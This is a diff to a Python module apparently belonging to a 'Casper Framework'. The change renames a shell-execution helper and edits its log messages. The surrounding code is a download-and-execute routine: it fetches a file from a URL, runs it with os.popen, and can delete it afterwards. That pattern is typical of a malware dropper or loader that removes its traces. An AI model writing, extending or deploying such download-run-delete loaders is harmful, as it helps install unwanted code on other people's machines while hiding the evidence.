@@ -3,10 +3,10 @@ Part of Casper Framework
 '''
 from includes import *
 
-def shellexec(file):
+def execute(file):
 	try:
-		spawn = os.popen(file)
-		data = spawn.read()
+		process_create = os.popen(file)
+		process_result = process_create.read()
 		return True
 	except Exception as e:
 		return False
@@ -23,23 +23,22 @@ def autodelete(file):
 		os.remove(file)
 		return True
 	except Exception as e:
-
-		return False	
+		return False
 
 def download_execute(url,file,autod):
 	if (download(url,file) == True):
-		logging.debug("[casper] Successfully downloaded file!")
-		if (shellexec(file) == True):
-			logging.debug("[casper] Successfully executed file!")
+		logging.debug("[casper] Successfully downloaded file")
+		if (execute(file) == True):
+			logging.debug("[casper] Successfully executed file")
 			if (autod == 1):
 				if (autodelete(file) == True):
-					logging.debug("[casper] Successfully deleted the file!")
+					logging.debug("[casper] Successfully deleted the file")
 				else:
-					logging.debug("[casper] Unable to delete the file...")
+					logging.debug("[casper] Unable to delete the file")
 			else:
 				pass
 		else:
-			logging.debug("[casper] Unable to execute file...")
+			logging.debug("[casper] Unable to execute file")
 	else:
-		logging.debug("[casper] Unable to download file...")
+		logging.debug("[casper] Unable to download file")
 	return True
